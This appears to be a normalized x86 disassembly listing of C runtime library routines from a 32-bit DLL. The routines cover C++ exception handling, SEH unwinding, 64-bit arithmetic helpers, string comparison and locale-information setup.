mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
and eax 0x2
je r-xdata
movzx ecx bl
movzx ecx [ esi + ecx * 2 ]
mov edx ecx
and edx 0x4
je r-xdata
or [ ebp + 0x18 ] 0x4
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp ecx [ ebp - 0x8 ]
jbe r-xdata
test [ ebp + 0x18 ] 0x2
je r-xdata
mov [ eax ] edi
test eax eax
jne r-xdata
cmp [ ebp - 0x4 ] 0x80000000
ja r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
neg [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] esi
jbe r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x14 ]
and [ eax + 0x70 ] 0xfffffffd
pop edi
pop ebx
sub_100818ce
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x10 ] 0x3
jne r-xdata
mov ecx [ eax + 0x14 ]
cmp ecx 0x19930520
je r-xdata
cmp [ eax + 0x1c ] 0x0
jne r-xdata
cmp ecx 0x19930521
je r-xdata
call sub_1002d269
xor ecx ecx
inc ecx
mov [ eax + 0x20c ] ecx
mov eax ecx
retn
cmp ecx 0x19930522
jne r-xdata
sub_10081913
mov edi edi
push ebp
mov ebp esp
xor eax eax
sub esp 0xc
cmp edi eax
jne r-xdata
mov [ ebp - 0x1 ] al
mov [ ebp - 0xc ] eax
cmp [ edi ] eax
jle r-xdata
call sub_10032da8
mov al [ ebp - 0x1 ]
leave
retn
push ebx
mov [ ebp - 0x8 ] eax
push esi
test ebx ebx
jg r-xdata
mov ecx [ ebp + 0x8 ]
push [ ecx + 0x1c ]
mov eax [ esi ]
push eax
mov eax [ edi + 0x4 ]
add eax [ ebp - 0x8 ]
push eax
call sub_1000fd97
add esp 0xc
test eax eax
jne r-xdata
jmp r-xdata
mov [ ebp - 0x1 ] 0x1
dec ebx
add esi 0x4
inc [ ebp - 0xc ]
mov eax [ ebp - 0xc ]
add [ ebp - 0x8 ] 0x10
cmp eax [ edi ]
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0xc ]
mov ebx [ eax ]
lea esi [ eax + 0x4 ]
jmp r-xdata
pop esi
pop ebx
sub_100819d2
push 0x2c
push r--data
call sub_1007fad0
mov ebx ecx
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x1c ] ebx
and [ ebp - 0x34 ] 0x0
mov eax [ edi - 0x4 ]
mov [ ebp - 0x24 ] eax
push [ esi + 0x18 ]
lea eax [ ebp - 0x3c ]
push eax
call sub_100684a3
pop ecx
pop ecx
mov [ ebp - 0x28 ] eax
call sub_1002d269
mov eax [ eax + 0x88 ]
mov [ ebp - 0x2c ] eax
call sub_1002d269
mov eax [ eax + 0x8c ]
mov [ ebp - 0x30 ] eax
call sub_1002d269
mov [ eax + 0x88 ] esi
call sub_1002d269
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x8c ] ecx
and [ ebp - 0x4 ] 0x0
xor eax eax
inc eax
mov [ ebp + 0x10 ] eax
mov [ ebp - 0x4 ] eax
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push ebx
push [ ebp + 0x14 ]
push edi
call sub_1005fe2a
add esp 0x14
mov [ ebp - 0x1c ] eax
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp + 0x10 ] 0x0
call sub_10081af8
mov eax [ ebp - 0x1c ]
call sub_1007fb15
retn
sub_10081a6b
mov esp [ ebp - 0x18 ]
call sub_1002d269
and [ eax + 0x20c ] 0x0
mov esi [ ebp + 0x14 ]
mov edi [ ebp + 0xc ]
cmp [ esi + 0x4 ] 0x80
jg r-xdata
mov ecx [ edi + 0x8 ]
movsx ecx [ edi + 0x8 ]
jmp r-xdata
push ecx
push esi
push 0x0
push edi
call sub_1006dd84
add esp 0x10
and [ ebp - 0x1c ] 0x0
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp + 0x10 ] 0x0
call sub_10081af8
mov eax [ ebp - 0x1c ]
call sub_1007fb15
retn
imul eax eax 0x14
mov edx [ eax + ebx + 0x4 ]
cmp ecx edx
jle r-xdata
mov ebx [ esi + 0x10 ]
and [ ebp - 0x20 ] 0x0
inc [ ebp - 0x20 ]
jmp r-xdata
cmp ecx [ eax + ebx + 0x8 ]
jg r-xdata
mov eax [ ebp - 0x20 ]
cmp eax [ esi + 0xc ]
jae r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ eax + edx * 8 + 0x8 ]
sub_10081af8
mov eax [ ebp - 0x24 ]
mov [ edi - 0x4 ] eax
push [ ebp - 0x28 ]
call sub_10006d21
pop ecx
call sub_1002d269
mov ecx [ ebp - 0x2c ]
mov [ eax + 0x88 ] ecx
call sub_1002d269
mov ecx [ ebp - 0x30 ]
mov [ eax + 0x8c ] ecx
cmp [ esi ] 0xe06d7363
jne r-xdata
retn
cmp [ esi + 0x10 ] 0x3
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x19930520
je r-xdata
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
cmp eax 0x19930522
jne r-xdata
push [ esi + 0x18 ]
call sub_1004b429
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push esi
call sub_10063bf6
pop ecx
pop ecx
sub_10081b6e
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x18 ] 0x0
je r-xdata
cmp [ ebp + 0x20 ] 0x0
push [ ebp + 0x8 ]
jne r-xdata
push [ ebp + 0x18 ]
push ebx
push esi
push [ ebp + 0x8 ]
call sub_10021fcf
add esp 0x10
push [ ebp + 0x20 ]
push esi
jmp r-xdata
pop ebp
retn
push esi
push eax
call sub_1002f1c8
call sub_1000a5dd
push [ edi ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push esi
call sub_1006dd84
mov eax [ edi + 0x4 ]
push 0x100
push [ ebp + 0x1c ]
inc eax
push [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
push [ ebp + 0xc ]
mov ecx [ ebx + 0xc ]
push esi
push [ ebp + 0x8 ]
call sub_100819d2
add esp 0x28
test eax eax
je r-xdata
sub_10081bdc
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi ] 0x80000003
je r-xdata
pop esi
leave
retn
push edi
call sub_1002d269
cmp [ eax + 0x80 ] 0x0
je r-xdata
mov edi [ ebp + 0x18 ]
cmp [ edi + 0xc ] 0x0
jne r-xdata
call sub_1002d269
lea edi [ eax + 0x80 ]
call sub_10030bed
cmp [ edi ] eax
je r-xdata
mov esi [ ebp + 0x1c ]
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push esi
push [ ebp + 0x20 ]
push edi
call sub_1002fff3
mov ecx [ ebp - 0x4 ]
add esp 0x14
cmp ecx [ ebp - 0xc ]
jae r-xdata
call sub_10032da8
mov eax [ esi ]
cmp eax 0xe0434f4d
je r-xdata
pop edi
add eax 0xc
mov [ ebp - 0x8 ] eax
push ebx
cmp eax 0xe0434352
je r-xdata
inc [ ebp - 0x4 ]
mov ecx [ ebp - 0x4 ]
add eax 0x14
mov [ ebp - 0x8 ] eax
cmp ecx [ ebp - 0xc ]
jb r-xdata
cmp esi [ eax - 0x8 ]
jg r-xdata
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_1001ff32
add esp 0x1c
test eax eax
jne r-xdata
lea edi [ eax - 0xc ]
cmp esi [ edi ]
jl r-xdata
pop ebx
mov ecx [ eax ]
shl ecx 0x4
add ecx [ eax + 0x4 ]
mov edx [ ecx - 0xc ]
test edx edx
je r-xdata
lea ebx [ ecx - 0x10 ]
test [ ebx ] 0x40
jne r-xdata
cmp [ edx + 0x8 ] 0x0
jne r-xdata
push [ ebp + 0x24 ]
mov esi [ ebp + 0xc ]
push [ ebp + 0x20 ]
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_10081b6e
mov esi [ ebp + 0x1c ]
mov eax [ ebp - 0x8 ]
add esp 0x1c
sub_10081ce3
mov edi edi
push ebp
mov ebp esp
sub esp 0x34
mov ecx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x18 ]
mov eax [ ebx + 0x4 ]
push esi
push edi
mov [ ebp - 0x1 ] 0x0
cmp eax 0x80
jg r-xdata
mov ecx [ ecx + 0x8 ]
movsx ecx [ ecx + 0x8 ]
jmp r-xdata
call sub_10032da8
cmp ecx eax
jl r-xdata
mov [ ebp - 0x8 ] ecx
cmp ecx 0xffffffff
jl r-xdata
mov esi [ ebp + 0x8 ]
mov edi 0xe06d7363
cmp [ esi ] edi
jne r-xdata
cmp [ ebx + 0xc ] 0x0
jbe r-xdata
cmp [ esi + 0x10 ] 0x3
mov ebx 0x19930520
jne r-xdata
call sub_1002d269
cmp [ eax + 0x94 ] 0x0
je r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
cmp [ esi ] edi
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
call sub_10032da8
call sub_10038c8a
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp - 0x8 ]
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_10081bdc
add esp 0x20
mov ebx [ ebp + 0x18 ]
cmp [ esi + 0x10 ] 0x3
jne r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
call sub_1002d269
cmp [ eax + 0x88 ] 0x0
je r-xdata
cmp eax 0x19930522
jne r-xdata
mov edi [ ebp + 0x18 ]
cmp [ edi + 0xc ] 0x0
jbe r-xdata
cmp eax 0x19930521
je r-xdata
call sub_1002d269
mov esi [ eax + 0x88 ]
mov [ ebp + 0x8 ] esi
call sub_1002d269
mov eax [ eax + 0x8c ]
push 0x1
push esi
mov [ ebp + 0x10 ] eax
call sub_10024678
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp [ ebp + 0x1c ] 0x0
je r-xdata
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
push [ ebp - 0x8 ]
push [ ebp + 0x20 ]
push edi
call sub_1002fff3
mov ecx [ ebp - 0x10 ]
add esp 0x14
cmp ecx [ ebp - 0x20 ]
jae r-xdata
cmp eax 0x19930522
jne r-xdata
cmp [ esi ] edi
jne r-xdata
call sub_10032da8
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
push 0x1
push esi
call sub_10063bf6
pop ecx
pop ecx
lea edi [ eax + 0x10 ]
mov [ ebp - 0x1c ] edi
call sub_1002d269
cmp [ eax + 0x94 ] 0x0
je r-xdata
cmp [ esi + 0x10 ] 0x3
jne r-xdata
mov eax [ edi ]
and eax 0x1fffffff
cmp eax 0x19930521
jb r-xdata
inc [ ebp - 0x10 ]
mov eax [ ebp - 0x10 ]
add edi 0x14
mov [ ebp - 0x1c ] edi
cmp eax [ ebp - 0x20 ]
jb r-xdata
cmp ecx [ edi - 0xc ]
jg r-xdata
call sub_1002d269
mov edi [ eax + 0x94 ]
call sub_1002d269
push [ ebp + 0x8 ]
xor esi esi
mov [ eax + 0x94 ] esi
call sub_10081913
pop ecx
test al al
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
mov edi [ edi + 0x1c ]
test edi edi
je r-xdata
mov ecx [ ebp - 0x8 ]
lea eax [ edi - 0x10 ]
mov [ ebp - 0x28 ] eax
cmp [ eax ] ecx
jg r-xdata
mov edi [ ebp + 0x18 ]
mov eax [ edi ]
mov [ ebp - 0xc ] eax
mov eax [ edi - 0x4 ]
mov [ ebp - 0x18 ] eax
test eax eax
jle r-xdata
mov esi [ ebp + 0x8 ]
mov edi 0xe06d7363
xor ebx ebx
cmp [ edi ] ebx
jle r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
push esi
call sub_10081913
pop ecx
test al al
jne r-xdata
mov eax [ esi + 0x1c ]
mov eax [ eax + 0xc ]
lea ebx [ eax + 0x4 ]
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
test eax eax
jle r-xdata
mov eax [ edi + 0x4 ]
mov ecx [ ebx + eax + 0x4 ]
push rw-data
call sub_1001b3a3
test al al
jne r-xdata
call sub_10032da8
cmp eax 0x19930522
jne r-xdata
call sub_1002d269
call sub_1002d269
call sub_1002d269
mov [ eax + 0x88 ] esi
call sub_1002d269
cmp [ ebp + 0x24 ] 0x0
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x8c ] ecx
push esi
jne r-xdata
dec [ ebp - 0x18 ]
add [ ebp - 0xc ] 0x10
cmp [ ebp - 0x18 ] 0x0
jg r-xdata
push [ esi + 0x1c ]
mov eax [ ebx ]
push eax
push [ ebp - 0xc ]
mov [ ebp - 0x24 ] eax
call sub_1000fd97
add esp 0xc
test eax eax
jne r-xdata
push 0x1
push [ ebp + 0x8 ]
call sub_10063bf6
pop ecx
pop ecx
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x34 ]
mov [ ebp + 0x8 ] r--data
call sub_10032538
push r--data
lea eax [ ebp - 0x34 ]
push eax
mov [ ebp - 0x34 ] r--data
call sub_10055e2a
inc esi
add ebx 0x10
cmp esi [ edi ]
jl r-xdata
push [ ebp + 0x24 ]
push [ ebp + 0xc ]
jmp r-xdata
jmp r-xdata
push [ ebp + 0x24 ]
mov edi [ ebp - 0x28 ]
push [ ebp + 0x20 ]
mov ebx [ ebp - 0xc ]
push [ ebp - 0x24 ]
mov [ ebp - 0x1 ] 0x1
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
call sub_10081b6e
mov esi [ ebp + 0x8 ]
mov edi [ ebp - 0x1c ]
add esp 0x1c
dec [ ebp - 0x14 ]
add ebx 0x4
cmp [ ebp - 0x14 ] eax
jg r-xdata
call sub_1000a5dd
mov esi [ ebp + 0x18 ]
push 0xffffffff
push esi
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_1006dd84
add esp 0x10
push [ esi + 0x1c ]
call sub_10081989
sub_10082060
push ebp
mov ebp esp
sub esp 0x4
push ebx
push ecx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebp
push [ ebp + 0x10 ]
mov ecx [ ebp + 0x10 ]
mov ebp [ ebp - 0x4 ]
call sub_1008370c
push esi
push edi
call eax
pop edi
pop esi
mov ebx ebp
pop ebp
mov ecx [ ebp + 0x10 ]
push ebp
mov ebp ebx
cmp ecx 0x100
jne r-xdata
push ecx
call sub_1008370c
pop ebp
pop ecx
pop ebx
leave
retn 0xc
mov ecx 0x2
sub_100820ac
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
xor ebx ebx
push esi
push edi
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x1c ] ebx
jne r-xdata
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x20 ] ebx
push ebx
push ebx
push [ ebp + 0x14 ]
setne al
push [ ebp + 0x10 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x1c ]
call esi
mov edi eax
cmp edi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x1c ] eax
jle r-xdata
xor eax eax
jmp r-xdata
test ebx ebx
je r-xdata
cmp edi 0x7ffffff0
ja r-xdata
lea esp [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
leave
retn
lea eax [ edi + edi ]
push eax
push 0x0
push ebx
call sub_1007f8f0
add esp 0xc
push edi
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x1c ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push ebx
call sub_1002255a
mov eax [ ebp - 0x8 ]
pop ecx
push [ ebp + 0x18 ]
push eax
push ebx
push [ ebp + 0xc ]
call [ GetStringTypeW@IAT ]
mov [ ebp - 0x8 ] eax
push eax
call sub_10021090
pop ecx
cmp eax ebx
je r-xdata
call sub_10082fa0
mov eax esp
cmp eax ebx
je r-xdata
mov ebx eax
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
add eax 0x8
sub_100821a0
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
or ecx ecx
je r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
mov bh 0x41
mov bl 0x5a
mov dh 0x20
lea ecx [ ecx ]
xor ecx ecx
cmp ah al
je r-xdata
or al al
je r-xdata
mov ecx 0xffffffff
jb r-xdata
add esi 0x1
add edi 0x1
cmp ah bh
jb r-xdata
neg ecx
cmp al bh
jb r-xdata
cmp ah bl
ja r-xdata
cmp ah al
jne r-xdata
cmp al bl
ja r-xdata
add ah dh
sub ecx 0x1
jne r-xdata
add al dh
mov ah [ esi ]
or ah ah
mov al [ edi ]
je r-xdata
sub_10082210
push ebx
push esi
push edi
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
push ebp
push edx
push eax
push ecx
push ecx
push sub_100822a0
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x8 ] eax
mov [ fs : 0x0 ] esp
pop [ fs : 0x0 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
mov edx [ esp + 0x34 ]
cmp edx 0xfffffffe
je r-xdata
lea esi [ esi + esi * 2 ]
lea ebx [ ebx + esi * 4 + 0x10 ]
mov ecx [ ebx ]
mov [ eax + 0xc ] ecx
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp esi edx
jbe r-xdata
mov eax [ esp + 0x30 ]
mov ebx [ eax + 0x8 ]
mov ecx [ esp + 0x2c ]
xor ebx [ ecx ]
mov esi [ eax + 0xc ]
cmp esi 0xfffffffe
je r-xdata
push 0x101
mov eax [ ebx + 0x8 ]
call sub_10083715
mov ecx 0x1
mov eax [ ebx + 0x8 ]
call sub_10083734
jmp r-xdata
sub_100822a0
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x8 ]
mov ecx [ eax + 0x8 ]
xor ecx eax
call sub_10032529
push ebp
mov ebp [ eax + 0x18 ]
push [ eax + 0xc ]
push [ eax + 0x10 ]
push [ eax + 0x14 ]
call sub_10082210
add esp 0xc
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_10082302
push ebp
push esi
push edi
push ebx
mov ebp edx
xor eax eax
xor ebx ebx
xor edx edx
xor esi esi
xor edi edi
call ecx
pop ebx
pop edi
pop esi
pop ebp
retn
sub_10082332
push ebp
mov ebp esp
push ebx
push esi
push edi
push 0x0
push edx
push r-xdata
push ecx
call RtlUnwind
pop edi
pop esi
pop ebx
pop ebp
retn
sub_10082370
push esi
mov eax [ esp + 0x14 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x8 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x10 ]
mov ecx eax
mov eax esi
mul [ esp + 0x10 ]
add edx ecx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x14 ]
mov ecx eax
mov eax [ esp + 0x10 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
pop esi
retn 0x10
dec esi
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja r-xdata
jb r-xdata
xor ebx ebx
cmp eax [ esp + 0x8 ]
jbe r-xdata
sub_10082410
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne r-xdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
sub_10082444
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
movzx ebx [ eax + 0x42 ]
push esi
mov esi ecx
movzx ecx [ eax + 0x44 ]
mov [ ebp - 0x4 ] ecx
test esi esi
jne r-xdata
and [ ebp - 0x8 ] 0x0
push edi
mov [ ebp - 0xc ] eax
lea eax [ esi + 0x4 ]
push eax
push 0x31
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001cffa
mov edi eax
lea eax [ esi + 0x8 ]
push eax
push 0x32
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001cffa
or edi eax
lea eax [ esi + 0xc ]
push eax
push 0x33
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001cffa
or edi eax
lea eax [ esi + 0x10 ]
push eax
push 0x34
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001cffa
add esp 0x50
or edi eax
lea eax [ esi + 0x14 ]
push eax
push 0x35
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001cffa
or edi eax
lea eax [ esi + 0x18 ]
push eax
push 0x36
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001cffa
push esi
push 0x37
push ebx
or edi eax
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001cffa
or edi eax
lea eax [ esi + 0x20 ]
push eax
push 0x2a
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001cffa
add esp 0x50
or edi eax
lea eax [ esi + 0x24 ]
push eax
push 0x2b
push ebx
push 0x1
lea eax [ ebp - 0xc ]
push eax
call sub_1001cffa
or edi eax
lea eax [ esi + 0x28 ]
push eax
push 0x2c
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001cffa
or edi eax
lea eax [ esi + 0x2c ]
push eax
push 0x2d
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001cffa
or edi eax
lea eax [ esi + 0x30 ]
push eax
push 0x2e
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001cffa
add esp 0x50
or edi eax
lea eax [ esi + 0x34 ]
push eax
push 0x2f
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001cffa
or edi eax
lea eax [ esi + 0x1c ]
push eax
push 0x30
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001cffa
or edi eax
lea eax [ esi + 0x38 ]
push eax
push 0x44
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001cffa
or edi eax
lea eax [ esi + 0x3c ]
push eax
push 0x45
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001cffa
add esp 0x50
or edi eax
lea eax [ esi + 0x40 ]
push eax
push 0x46
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001cffa
or edi eax
lea eax [ esi + 0x44 ]
push eax
push 0x47
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001cffa
or edi eax
lea eax [ esi + 0x48 ]
push eax
push 0x48
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001cffa
or edi eax
lea eax [ esi + 0x4c ]
push eax
push 0x49
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001cffa
add esp 0x50
or edi eax
lea eax [ esi + 0x50 ]
push eax
push 0x4a
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001cffa
or edi eax
lea eax [ esi + 0x54 ]
push eax
push 0x4b
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001cffa
or edi eax
lea eax [ esi + 0x58 ]
push eax
push 0x4c
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001cffa
or edi eax
lea eax [ esi + 0x5c ]
push eax
push 0x4d
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001cffa
add esp 0x50
or edi eax
lea eax [ esi + 0x60 ]
push eax
push 0x4e
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001cffa
or edi eax
lea eax [ esi + 0x64 ]
push eax
push 0x4f
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001cffa
or edi eax
lea eax [ esi + 0x68 ]
push eax
push 0x38
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001cffa
or edi eax
lea eax [ esi + 0x6c ]
push eax
push 0x39
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001cffa
add esp 0x50
or edi eax
lea eax [ esi + 0x70 ]
push eax
push 0x3a
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001cffa
or edi eax
lea eax [ esi + 0x74 ]
push eax
push 0x3b
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001cffa
or edi eax
lea eax [ esi + 0x78 ]
push eax
push 0x3c
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001cffa
or edi eax
lea eax [ esi + 0x7c ]
push eax
push 0x3d
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001cffa
add esp 0x50
or edi eax
lea eax [ esi + 0x80 ]
push eax
push 0x3e
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001cffa
or edi eax
lea eax [ esi + 0x84 ]
push eax
push 0x3f
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001cffa
or edi eax
lea eax [ esi + 0x88 ]
push eax
push 0x40
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001cffa
or edi eax
lea eax [ esi + 0x8c ]
push eax
push 0x41
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001cffa
add esp 0x50
or edi eax
lea eax [ esi + 0x90 ]
push eax
push 0x42
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001cffa
or edi eax
lea eax [ esi + 0x94 ]
push eax
push 0x43
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001cffa
or edi eax
lea eax [ esi + 0x98 ]
push eax
push 0x28
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001cffa
or edi eax
lea eax [ esi + 0x9c ]
push eax
push 0x29
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001cffa
add esp 0x50
or edi eax
lea eax [ esi + 0xa0 ]
push eax
push 0x1f
push [ ebp - 0x4 ]
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001cffa
or edi eax
lea eax [ esi + 0xa4 ]
push eax
push 0x20
push [ ebp - 0x4 ]
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001cffa
or edi eax
lea eax [ esi + 0xa8 ]
push eax
push 0x1003
push [ ebp - 0x4 ]
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001cffa
or edi eax
lea eax [ esi + 0xb0 ]
push eax
push 0x1009
push [ ebp - 0x4 ]
lea eax [ ebp - 0xc ]
push 0x0
push eax
call sub_1001cffa
or edi eax
mov eax [ ebp - 0x4 ]
add esp 0x50
mov [ esi + 0xac ] eax
lea eax [ esi + 0xbc ]
push eax
push 0x31
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001cffa
or edi eax
lea eax [ esi + 0xc0 ]
push eax
push 0x32
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001cffa
or edi eax
lea eax [ esi + 0xc4 ]
push eax
push 0x33
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001cffa
or edi eax
lea eax [ esi + 0xc8 ]
push eax
push 0x34
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001cffa
add esp 0x50
or edi eax
lea eax [ esi + 0xcc ]
push eax
push 0x35
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001cffa
or edi eax
lea eax [ esi + 0xd0 ]
push eax
push 0x36
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001cffa
or edi eax
